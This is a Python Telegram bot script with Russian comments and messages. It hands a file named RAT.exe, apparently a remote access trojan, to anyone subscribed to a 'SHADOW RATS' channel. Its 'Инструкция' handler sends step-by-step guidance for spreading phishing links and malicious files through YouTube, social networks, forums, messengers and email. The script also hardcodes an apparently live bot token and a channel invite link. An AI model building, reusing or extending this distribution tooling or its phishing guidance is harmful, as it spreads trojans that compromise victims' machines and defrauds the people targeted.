import os
import telebot
from telebot import types

# Замените на ваш токен бота
API_TOKEN = '7138095299:AAH3YEgptfE-Me22NR6jpeZJZWiihXfbWPY'

# Замените на ID вашего канала
CHANNEL_ID = '-1002331312384'

# Замените на путь к вашему файлу RAT.exe
RAT_FILE_PATH = 'RAT.exe'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    
    # Проверка подписки на канал
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            bot.send_message(message.chat.id, "Добро пожаловать в команду SHADOW RATS.")
            with open(RAT_FILE_PATH, 'rb') as file:
                bot.send_document(message.chat.id, file)
            
            # Добавляем кнопку "Инструкция"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            instruction_button = types.KeyboardButton("Инструкция")
            markup.add(instruction_button)
            bot.send_message(message.chat.id, "Нажмите кнопку 'Инструкция' для получения инструкции по распространению.", reply_markup=markup)
        else:
            send_subscription_buttons(message.chat.id)
    except Exception as e:
        bot.send_message(message.chat.id, "Произошла ошибка при проверке подписки.")

def send_subscription_buttons(chat_id):
    markup = types.InlineKeyboardMarkup()
    subscribe_button = types.InlineKeyboardButton("Подписаться", url="https://t.me/+7U6yF05xjpljODJi")
    check_button = types.InlineKeyboardButton("Проверить", callback_data="check_subscription")
    markup.add(subscribe_button, check_button)
    bot.send_message(chat_id, "Вы должны быть подписаны на канал [SHADOW RATS] (https://t.me/+7U6yF05xjpljODJi) для получения доступа.", parse_mode='Markdown', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data == "check_subscription")
def check_subscription(call):
    user_id = call.from_user.id
    
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ['member', 'creator', 'administrator']:
            bot.send_message(call.message.chat.id, "Добро пожаловать в команду SHADOW RATS.")
            with open(RAT_FILE_PATH, 'rb') as file:
                bot.send_document(call.message.chat.id, file)
            
            # Добавляем кнопку "Инструкция"
            markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
            instruction_button = types.KeyboardButton("Инструкция")
            markup.add(instruction_button)
            bot.send_message(call.message.chat.id, "Нажмите кнопку 'Инструкция' для получения инструкции по распространению.", reply_markup=markup)
        else:
            send_subscription_buttons(call.message.chat.id)
    except Exception as e:
        bot.send_message(call.message.chat.id, "Произошла ошибка при проверке подписки.")

@bot.message_handler(func=lambda message: message.text == "Инструкция")
def send_instruction(message):
    instruction = (
        "Инструкция по распространению:\n\n"
        "1. YouTube:\n"
        "   - Создайте видео-обзор или учебный ролик, связанный с темой, интересующей вашу аудиторию.\n"
        "   - В описании к видео разместите ссылки на фишинговые страницы или вредоносные файлы.\n"
        "   - Используйте SEO-оптимизацию и рекламу для привлечения большего количества зрителей.\n\n"
        "2. Социальные сети:\n"
        "   - Поделитесь ссылками на фишинговые страницы или вредоносные файлы в социальных сетях.\n"
        "   - Притворитесь легитимным пользователем и делитесь контентом, чтобы привлечь внимание.\n\n"
        "3. Форумы:\n"
        "   - Разместите фишинговый контент на форумах, посвященных интересам вашей целевой аудитории.\n"
        "   - Используйте убедительный язык, чтобы побудить пользователей перейти по ссылкам, скачать и запустить файл.\n\n"
        "4. Мессенджеры:\n"
        "   - Отправляйте фишинговые сообщения через мессенджеры, такие как WhatsApp, Telegram, Viber.\n"
        "   - Используйте массовые рассылки для достижения большего охвата.\n\n"
        "5. Электронная почта:\n"
        "   - Рассылайте фишинговые письма на адреса электронной почты, собранные из открытых источников.\n"
        "   - Используйте убедительные темы и тексты, чтобы побудить пользователей открыть письмо и запустить файл."
    )
    bot.send_message(message.chat.id, instruction)

bot.polling()
